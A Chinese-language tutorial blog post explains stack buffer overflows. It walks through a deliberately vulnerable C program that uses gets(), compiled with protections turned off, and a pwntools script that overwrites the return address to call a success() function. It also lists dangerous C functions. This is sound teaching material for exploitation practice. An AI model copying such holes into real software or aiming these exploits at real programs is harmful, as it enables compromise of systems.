### 函数条用约定（Linux）

> 需要注意的是，32 位和 64 位程序有以下简单的区别x86函数参数在函数返回地址的上方x64System V AMD64 ABI
> (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9
> 寄存器中，如果还有更多的参数的话才会保存在栈上。内存地址不能大于 0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常。

### 堆栈溢出原理

栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的
**缓冲区溢出漏洞** ，类似的还有堆溢出，bss
段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是

  * 程序必须向栈上写入数据
  * 写入的数据大小没有被良好地控制。

#### 基本示例

势力代码exit.c如下：

  1. `#include<stdio.h>`
  2. `#include <string.h>`
  3. `#include<stdlib.h>`
  4. `void success() { puts("You Hava already controlled it."); }`
  5. `void vulnerable(){`
  6. ` char s[12];`
  7. ` gets(s);`
  8. ` puts(s);`
  9. ` return;`
  10. `}`
  11. `int main(){`
  12. ` vulnerable();`
  13. ` return 0;`
  14. `}`

这个程序的主要目的读取一个字符串，并将其输出。 **我们希望可以控制程序执行 success 函数** 。通过gcc进行编译：

  1. ` gcc -m32 -ggdb -z execstack -fno-stack-protector -no-pie -o pwnme exit.c`

关闭pie、关闭栈保护(Canary)，堆栈可执行(NX为开启)。通过checksec查看，如图：![在这里插入图片描述](https://img-blog.csdnimg.cn/20200616223532701.png)使用radare2进行调试：首先查看success的地址，如下所示为0x08048456，由于关闭了pie和ASLR，这个值是固定的。![在这里插入图片描述](https://img-blog.csdnimg.cn/2020061622374552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbGxvd29ybGRkbQ==,size_16,color_FFFFFF,t_70)对pwnme这个程序中进行逆向，查看vulnerable的汇编代码：![在这里插入图片描述](https://img-blog.csdnimg.cn/2020061622421336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbGxvd29ybGRkbQ==,size_16,color_FFFFFF,t_70)

#### 攻击思路

由于gets
本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出。而本次溢出攻击基于的就是gets函数。通过radare2进行调试，在puts函数断点，输入'AAAAAAA'，查看函数堆栈情况如下：![在这里插入图片描述](https://img-blog.csdnimg.cn/20200616225939727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlbGxvd29ybGRkbQ==,size_16,color_FFFFFF,t_70)通过分析汇编代码和堆栈数据，可以得出如下所示的栈结构。

  1. ` High`
  2. ` Address | |`
  3. ` +-----------------+`
  4. ` | args |`
  5. ` +-----------------+`
  6. ` | return address |`
  7. ` +-----------------+`
  8. ` ebp | old ebp |`
  9. ` +-----------------+`
  10. ` | ... |`
  11. ` +-----------------+`
  12. ` ebp-14| local variables |`
  13. ` Low | |`
  14. ` Address`

要执行success函数，我们可以直接将堆栈中返回地址(return
address)的值设置为success的地址，然后，当vulnerable返回的时候，就会跳转到success函数的地址。

#### 攻击代码

  1. `##coding=utf8`
  2. `from pwn import *`
  3. `## 构造与程序交互的对象`
  4. `sh = process('./pwnme')`
  5. `success_addr = 0x08048456`
  6. `## 构造payload`
  7. `payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)`
  8. `print p32(success_addr)`
  9. `## 向程序发送字符串`
  10. `sh.sendline(payload)`
  11. `## 将代码交互转换为手工交互`
  12. `sh.interactive()`

运行python代码，效果如图所示， **我们成功的调用了success函数** 。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200616225550865.png)

### 小总结

上面的示例其实也展示了栈溢出中比较重要的几个步骤。

#### 寻找危险函数

通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下

>  
>
>
>   1. `输入`
>   2. ` gets，直接读取一行，忽略'\x00'`
>   3. ` scanf`
>   4. ` vscanf`
>   5. `输出`
>   6. ` sprintf`
>   7. `字符串`
>   8. ` strcpy，字符串复制，遇到'\x00'停止`
>   9. ` strcat，字符串拼接，遇到'\x00'停止`
>   10. ` bcopy`
>

>
>  
>

#### 确定填充长度

>
> 这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开Radare2，根据其给定的地址计算偏移。一般变量会有以下几种索引模式
>
>   1. `相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得`
>   2. `相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。`
>   3. `直接地址索引，就相当于直接给定了地址。`
>

>
> 一般来说，我们会有如下的覆盖需求
>
>   1. `覆盖函数返回地址，这时候就是直接看 EBP 即可。`
>   2. `覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。`
>   3. `覆盖 bss 段某个变量的内容。`
>   4. `根据现实执行情况，覆盖特定的变量或地址的内容。`
>

>
> 之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。

### 公众号

更过安全相关内容，欢迎关注我的公众号：![在这里插入图片描述](https://img-blog.csdnimg.cn/2020061623041225.jpg)

  

